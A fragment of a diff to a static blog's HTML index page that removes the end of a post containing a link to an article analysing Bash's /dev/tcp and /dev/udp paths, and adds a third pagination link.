-<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/80d6b5a61372">Bash /dev/(tcp|udp)/${HOST}/${PORT} 分析</a></li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
